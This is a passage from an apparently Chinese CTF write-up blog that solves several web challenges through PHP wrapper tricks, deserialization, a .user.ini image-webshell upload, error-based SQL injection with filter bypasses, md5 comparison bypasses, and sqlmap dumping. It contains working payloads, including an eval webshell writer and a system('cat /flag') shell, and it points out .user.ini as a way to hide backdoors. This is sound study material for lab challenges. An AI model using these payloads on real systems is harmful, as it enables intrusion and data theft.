class="hljs-number">20</span></code></pre><p>绕money的：<strong>长度有问题，应该是strcmp函数检测的</strong></p><blockquote><p>strcmp函数漏洞：strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值NULL，<strong>NULL==0</strong>，正是利用这点进行绕过</p></blockquote><pre><code class="hljs cpp">money[]可以绕开<span class="hljs-built_in">strcmp</span>函数</code></pre><h2 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</h2><h4 id="考点flle_get_contents-伪协议字符比较反序列化echo-tostring">考点：flle_get_contents()、伪协议字符比较、反序列化echo tostring</h4><h4 id="php">php://</h4><ul><li><strong>条件</strong>：<ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code>:仅<code>php://input php://stdin php://memory php://temp</code>需要on</li></ul></li></ul><p>php://filter用于读取源码，php://input用于执行php代码。</p><table><colgroup><col style="width: 16%"><col style="width: 83%"></colgroup><thead><tr class="header"><th>协议</th><th>作用</th></tr></thead><tbody><tr class="odd"><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，==在<code>enctype="multipart/form-data"</code>的时候<code>php://input</code>是无效的。==</td></tr><tr class="even"><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，<strong>类似<code>readfile()</code>、<code>file()</code> 和<code>file_get_contents()</code></strong>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><pre><code class="hljs php">示例：http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input</span>[POST DATA部分]<span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>写入一句话：http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input</span>[POST DATA部分]<span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;1juhua.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span></code></pre><h4 id="date">date://</h4><ul><li><p><strong>条件</strong>：</p><ul><li><p><code>allow_url_fopen</code>:on</p></li><li><p><code>allow_url_include</code> :on</p></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p>用法：</p></li></ul><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain,</span>data:<span class="hljs-comment">//text/plain;base64,</span>http:<span class="hljs-comment">//127.0.0.1/include.php?file=data://text/plain,<span class="hljs-meta">&lt;?php</span>%20phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre></li></ul><h4 id="flle_get_contents">flle_get_contents()</h4><p>flle_get_contents() 函数,而这个函数是可以绕过的 绕过方式有多种:●使用php://input伪协议绕过 ①将要GET的参数?xxx=php://input②用post方法传入想要file_get_contents() 函数返回的值 ●用data://伪协议绕过将url改为: ?xxx=data://text/plain;base64,想要 file_get_contents()函数返回的值的base64编码 或者将url改为:?xxx=data:text/plain,(url编码的内容)</p><p>==php://input和data://常在CTF里用来绕过一些判断语句;、file_get_contents()==</p><p><strong>总结：</strong></p><p>data://　　　　写入数据</p><p>php://input　　执行php</p><p>　　//filter　　查看源码</p><p>解题：index.php源码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  $text = $_GET[<span class="hljs-string">&quot;text&quot;</span>];$file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];$password = $_GET[<span class="hljs-string">&quot;password&quot;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;  <span class="hljs-comment">//伪协议绕过</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$file))&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;        <span class="hljs-keyword">exit</span>();     &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">include</span>($file);  <span class="hljs-comment">//useless.php   通过伪协议filter读取文件源码</span>        $password = unserialize($password);  <span class="hljs-comment">//反序列化触发wake_up，这里并不是这个考点</span>        <span class="hljs-keyword">echo</span> $password;   <span class="hljs-comment">//echo对象会触发tostring</span>    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>用data://绕过file_get_contents，php://filter绕过include读取文件base64源码</p><pre><code class="hljs awk">?text=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain,welcome to the zjctf&amp;file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=useless.php&amp;password=<span class="hljs-number">2</span></code></pre><p>读到useless.php源码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span>    <span class="hljs-keyword">public</span> $file;      <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;   <span class="hljs-comment">//如果对象被当作字符串echo会触发这个方法</span>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;              <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);             <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);        &#125;      &#125;  &#125;  <span class="hljs-meta">?&gt;</span></code></pre><p>password反序列化读flag.php，</p><p>payload:构造序列化脚本：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<span class="hljs-keyword">public</span> $file=<span class="hljs-string">&#x27;flag.php&#x27;</span>;&#125; $flag = <span class="hljs-keyword">new</span> Flag();$flag_1 = serialize($flag);<span class="hljs-keyword">echo</span> $flag_1;<span class="hljs-meta">?&gt;</span></code></pre><pre><code class="hljs pgsql">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125;</code></pre><p>查看源码得到flag</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220307210749077.png" alt="image-20220307210749077" style="zoom:80%;"></p><h2 id="suctf-2019checkin">[SUCTF 2019]CheckIn</h2><h4 id="考点nginx的.user.ini图片头">考点：nginx的.user.ini、图片头</h4><p>关键点就是.user.ini与.htaccess的应用范围、.user.ini还需要同目录下存在一个可执行的php文件、上传图片马后url访问的不是图片地址，而是可执行php文件地址</p><blockquote><p><a href="https://xz.aliyun.com/t/6091">参考WP</a></p></blockquote><p>文件上传</p><ol type="1"><li><p>对后缀的过滤：php：不行，txt：可以，jpg：可以</p></li><li><p>上传图片马：发现过滤&lt;?，绕过:</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">php</span>&gt;</span>echo ‘123’;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></li><li><p>上传.htaccess也不行，必须是图片：改Content-Type:image/jpeg、后缀也不行（估计有图片头检验）</p></li></ol><p>​然后加上图片头：<code>GIF89A</code>，发现没警告了，但是并不能解析成php</p><p><strong>原因在于本题服务器是nginx不是apache</strong>,（nginx要引用.htaccess也可以，但是还要进行某部分修改），这里显然不满足条件，所以没用。</p><h4 id="user.ini">.user.ini</h4><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/20190824211552-4c92f9fe-c671-1.png" alt="user.ini"></p><p>也就是说我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR 和PHP_INI_USER 模式的 INI 设置，而且只要是在使用 CGI／FastCGI模式的服务器上都可以使用.user.ini</p><p><strong>大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php）</strong>，类似于在index.php中插入一句：<code>require(./a.jpg)</code>;【<strong>类似.htaccess，只不过针对不同服务器</strong>】</p><ul><li><p>其中有两个配置，可以用来制造后门：auto_append_file、auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数.而auto_append_file类似，只是在文件后面包含</p></li><li><p>用法：</p><p>直接写在.user.ini中：</p><pre><code class="hljs awk">auto_prepend_file=test.jpg 或auto_append_file=test.jpg（当文件调用的有<span class="hljs-keyword">exit</span>()时该设置无效）</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220307214829826.png" alt="image-20220307214829826"></p></li></ul><p>此时我们注意到上传目录下还有一个index.php，<strong>我们正好需要该目录下有一个可执行php文件</strong>，那这简直暴露了考点就是<code>.user.ini</code>，看来这个思路应该是可行的</p><p>上传<code>.user.ini</code>：</p><pre><code class="hljs routeros">GIF89a<span class="hljs-attribute">auto_prepend_file</span>=shell.jpg</code></pre><p>上传图片马：shell.jpg</p><pre><code class="hljs xml">GIF89a<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="javascript">system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>==最后，访问index.php，注意是可执行的php而不是访问上传的图片马！==</p><pre><code class="hljs awk"><span class="hljs-regexp">/uploads/</span>cc551ab005b2e60fbdc88de809b2c4b1/index.php</code></pre><h4 id="user.ini实战利用的可能性">.user.ini实战利用的可能性</h4><p>综上所述<code>.user.ini</code>的利用条件如下：</p><ol type="1"><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ol><p><strong><em>从这来看<code>.user.ini</code>要比<code>.htaccess</code>的应用范围要广一些，毕竟<code>.htaccess</code>只能用于Apache</em></strong></p><p>但仔细推敲我们就会感到<strong>“上传目录下要有可执行的php文件”</strong>这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。</p><p>但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，前段时间我遇到一个CMS对上传时的路径没有检测<code>../</code>，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用<code>.user.ini</code></p><p>除此之外，把<code>.user.ini</code>利用在隐藏后门上应该是个很好的利用方法，我们在存在php文件的目录下留下<code>.user.ini</code>和我们的图片马，这样就达到了隐藏后门的目的。</p><h2 id="极客大挑战-2019hardsql">[极客大挑战 2019]HardSQL</h2><h4 id="考点报错注入空格被过滤截取部分字符串函数">考点：报错注入、空格=被过滤、截取部分字符串函数</h4><p>关键点就是针对各种过滤，先利用burp爆破sql注入关键词字典，看哪些没有被过滤的，发现updatexml没有==&gt;报错注入，然后针对被过滤的关键词找替代绕过，=》like，空格》()，and》^，然后针对updatexml、extractvalue的缺陷：只能返回32位数据，利用字符串截取函数截取剩下部分flag</p><blockquote><p>参考：<a href="https://www.freebuf.com/articles/web/264593.html"><strong>MySQL注入绕过WAF的基础方式</strong></a></p><p><a href="https://xz.aliyun.com/t/7169#toc-30"><strong>对MYSQL注入相关内容及部分Trick、绕过的归类小结</strong></a></p></blockquote><p>用sql关键词字典爆破，线程数调低点，发现过滤了=、union、by、！、&amp;、|、*、空格【()、%0a绕过】、and、、</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220308210613847.png" alt="image-20220308210613847" style="zoom:67%;"></p><p><strong>但是！</strong>没有过滤<code>updatexml</code>、extractvalue==》尝试报错注入</p><pre><code class="hljs excel"><span class="hljs-built_in">and</span>、<span class="hljs-built_in">or</span>、&amp;&amp;、||被过滤——可用运算符! ^ ~以及<span class="hljs-built_in">not</span> <span class="hljs-built_in">xor</span>来代替空格被过滤——%<span class="hljs-number">09</span>, %<span class="hljs-number">0</span>a, %<span class="hljs-number">0</span>b, %<span class="hljs-number">0</span>c, %<span class="hljs-number">0</span>d, %<span class="hljs-symbol">a0</span>（等部分不可见字符可也代替空格）、<span class="hljs-built_in">and</span>/<span class="hljs-built_in">or</span>后面可以跟上偶数个!、~可以替代空格、改用+号、使用注释代替、多层括号嵌套= -&gt; like -&gt; regexp -&gt; &lt;&gt; -&gt; in</code></pre><h4 id="报错注入">报错注入：</h4><p>函数：</p><pre><code class="hljs apache"><span class="hljs-attribute">exp</span>(~(select * from(select user())a))<span class="hljs-attribute">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)   //三个参数  <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e:~<span class="hljs-attribute">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select user()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e)))   //两个参数</code></pre><p>爆库名：</p><pre><code class="hljs sql">check.php?username=1&amp;password=&#x27;^(updatexml(1,concat(0x7e,(<span class="hljs-keyword">SELECT</span>(@@<span class="hljs-keyword">version</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">&#x27;~10.3.18-MariaDB~&#x27;</span>check.php?username=<span class="hljs-number">1</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;^(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))%23</span><span class="hljs-string">或1&#x27;</span>^extractvalue(<span class="hljs-number">0x0a</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">database</span>()))))%<span class="hljs-number">23</span>XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">&#x27;~geek~&#x27;</span></code></pre><p>爆表名：【注意select后一大串都需要括起来】</p><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&#x27;^extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))%<span class="hljs-number">23</span><span class="hljs-attribute">XPATH</span> syntax error: &#x27;~H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>&#x27;</code></pre><p>爆列名：</p><pre><code class="hljs sql">username=1&amp;password=1&#x27;^extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;geek&#x27;</span>))))%<span class="hljs-number">23</span>XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">&#x27;~id,username,password&#x27;</span></code></pre><p>爆字段：</p><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">1</span>&#x27;^extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(group_concat(id,username,password))from(H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>))))%<span class="hljs-number">23</span><span class="hljs-attribute">XPATH</span> syntax error: &#x27;~<span class="hljs-number">1</span>flagflag&#123;<span class="hljs-number">1</span>f<span class="hljs-number">077763</span>-bd<span class="hljs-number">8</span>b-<span class="hljs-number">4</span>ef<span class="hljs-number">1</span>-<span class="hljs-number">92</span>&#x27;<span class="hljs-attribute">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(group_concat(password))from(H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>))))%<span class="hljs-number">23</span>  //还是只回显一半，==》<span class="hljs-attribute">XPATH</span> syntax error: &#x27;~flag&#123;<span class="hljs-number">1</span>f<span class="hljs-number">077763</span>-bd<span class="hljs-number">8</span>b-<span class="hljs-number">4</span>ef<span class="hljs-number">1</span>-<span class="hljs-number">92</span>d<span class="hljs-number">9</span>-<span class="hljs-number">01</span>&#x27;</code></pre><p><strong>extractvalue()和updatexml()</strong>只能回显==32位长度==的数据</p><p><strong>extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</strong></p><h4 id="截取部分长度字符串函数">截取部分长度字符串函数：</h4><table><colgroup><col style="width: 34%"><col style="width: 65%"></colgroup><thead><tr class="header"><th>lefft(str,len)</th><th>对指定字符串从最左边截取指定长度。</th></tr></thead><tbody><tr class="odd"><td>right(str,len)</td><td>对指定字符串从<strong>最右边</strong>截取指定长度</td></tr><tr class="even"><td>substr(str,N_start,N_length)</td><td>对指定字符串进行截取，为SUBSTRING的简单版。</td></tr><tr class="odd"><td>mid(column_name,start[,length])</td><td>str="123456" mid(str,2,1) 结果为2【类似string、substr】</td></tr></tbody></table><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;^extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select(right(password,<span class="hljs-number">15</span>))from(H<span class="hljs-number">4</span>rDsq<span class="hljs-number">1</span>))))%<span class="hljs-number">23</span><span class="hljs-attribute">XPATH</span> syntax error: &#x27;~<span class="hljs-number">9</span>-<span class="hljs-number">01</span>edbdbb<span class="hljs-number">1804</span>&#125;&#x27;</code></pre><p>拼接得到完整flag</p><h2 id="mrctf2020ez_bypass容易">[MRCTF2020]Ez_bypass（容易）</h2><h4 id="考点md5强比较绕过弱比较">考点：md5强比较绕过、弱比较</h4><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;$flag=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;    $id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>];    $gg=$_GET[<span class="hljs-string">&#x27;gg&#x27;</span>];    <span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;   <span class="hljs-comment">//❗强等于，数组绕过即可</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;            $passwd=$_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>];            <span class="hljs-keyword">if</span> (!is_numeric($passwd))            &#123;                 <span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>)   <span class="hljs-comment">//passwd=1234567a即可绕过</span>                 &#123;                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;                     highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);   <span class="hljs-comment">//❗</span>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);                 &#125;                 <span class="hljs-keyword">else</span>                 &#123;                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;                 &#125;            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;            &#125;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);  <span class="hljs-comment">//passwd没赋值的情况</span>        &#125;&#125;    <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);&#125;&#125;Please input first</code></pre><p>md5比较：</p><p>但是，强比较（===）不仅比较值，还比较类型，0e此时被当作字符串，所以不能用0e来进行绕过碰撞，只能用数组绕过，or，找两个值不同但MD5相同的</p><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-title">array</span>()) = <span class="hljs-variable"><span class="hljs-literal">null</span></span></span></code></pre><p>payload：</p><pre><code class="hljs angelscript">?gg[]=<span class="hljs-number">1</span>&amp;id[]=<span class="hljs-number">2</span>passwd=<span class="hljs-number">1234567</span>a</code></pre><h2 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli（*）</h2><h4 id="考点手工联合查询不存在数据构造虚拟数据绕过md5密码验证">考点：手工+联合查询不存在数据构造虚拟数据绕过md5密码验证</h4><p>关键点：对orderby后并不回显123而是验证用户名/密码正确与否，——绕过密码的md5验证：需要把我们输入的值和数据库里面存放的用户密码的md5值进行比较，<strong>可以用联合查询语句用来生成虚拟的表数据覆盖原用户admin绕过</strong></p><p>点进去是登录框，然后name有注入点而pw没有！</p><p>sqlmap跑：发现是延时注入</p><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php --forms</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309120711794.png" alt="image-20220309120711794" style="zoom:67%;"></p><p>跑库名 ：</p><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php --current-db --forms<span class="hljs-attribute">web_sqli</span></code></pre><p>跑表名：</p><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli --tables --forms<span class="hljs-attribute">user</span></code></pre><p>爆数据</p><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli -T user --dump --forms -C id<span class="hljs-attribute">1</span><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli -T user --dump --forms -C username<span class="hljs-attribute">admin</span><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli -T user --dump --forms -C passwd<span class="hljs-attribute">cdc9c819c7f8be2628d4180669009d28</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309121646850.png" alt="image-20220309121646850" style="zoom:67%;"></p><p>但是登录不上去，密码尝试md5破解也不行，base32加密再base64加密也不行【后续手工发现是hash了，但是没有告知盐，所以这里密码不能破解】</p><p>手工：</p><p>提交数据后跳转到search.php，源码看到注释提示，base64/md5都解不出来，一键解码工具</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122020599.png" alt="image-20220309122020599" style="zoom:80%;"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122033327.png" alt="image-20220309122033327" style="zoom: 67%;"></p><p>解出SQL语句</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122102792.png" alt="image-20220309122102792" style="zoom:67%;"></p><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where username = <span class="hljs-string">&#x27;$name&#x27;</span></code></pre><p>看来真是name存在注入</p><p>order被过滤：大小写字母就能绕过</p><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=1&#x27;Order by 3#&amp;<span class="hljs-attribute">pw</span>=2  ——wrong user!<span class="hljs-attribute">name</span>=1&#x27;Order by 4#&amp;<span class="hljs-attribute">pw</span>=2  ——Error: Unknown column <span class="hljs-string">&#x27;4&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;order clause&#x27;</span>——3列数据</code></pre><p>然后<code>name=-'union select 1,2,3#&amp;pw=2</code>发现回显<strong>wronguser!</strong></p><p>而<code>name=-'union select 1,'admin',3#&amp;pw=2</code>回显wrongpass</p><p><strong>那么就是先查询，查询不到数据则 ’ worryuser’,再用查询出来的数据对比password，对比不符合则 ’ worry pass’</strong></p><p>但当我们是测试admin用户时却回显wrongpass!(密码错误)，很明显这里绝对存在admin这个账号。此时，我们的思路就是登上admin用户或者得到admin的密码，但是密码是经过hash运算的，怎么得知/解密呢？</p><h4 id="新知识点虚拟数据">新知识点：虚拟数据</h4><blockquote><p><a href="https://blog.csdn.net/qq_45521281/article/details/107167452">参考WP</a></p></blockquote><p> <strong>当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据</strong></p><p>举个例子：如果users表中只有一行数据，我们通过unionselect查询就可以构造一行虚拟的数据，</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/20200706211115507.png" style="zoom:80%;"></p><p><strong>那么我们的思路就来了，我们可以利用联合查询来创建一行admin账户的续集数据，混淆admin用户的密码，将我们自定义的admin用户的密码（123）加进去，这样我们不就可以登录admin用户了吗。</strong></p><p>看到源码</p><pre><code class="hljs php">mysqli_query($con,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);$name = $_POST[<span class="hljs-string">&#x27;name&#x27;</span>];$password = $_POST[<span class="hljs-string">&#x27;pw&#x27;</span>];$t_pw = md5($password);$sql = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.$name.<span class="hljs-string">&quot;&#x27;&quot;</span>;<span class="hljs-comment">// echo $sql;</span>$result = mysqli_query($con, $sql);<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, $name))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack me!&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">if</span> (!$result) &#123;printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error($con));<span class="hljs-keyword">exit</span>();&#125;<span class="hljs-keyword">else</span>&#123;<span 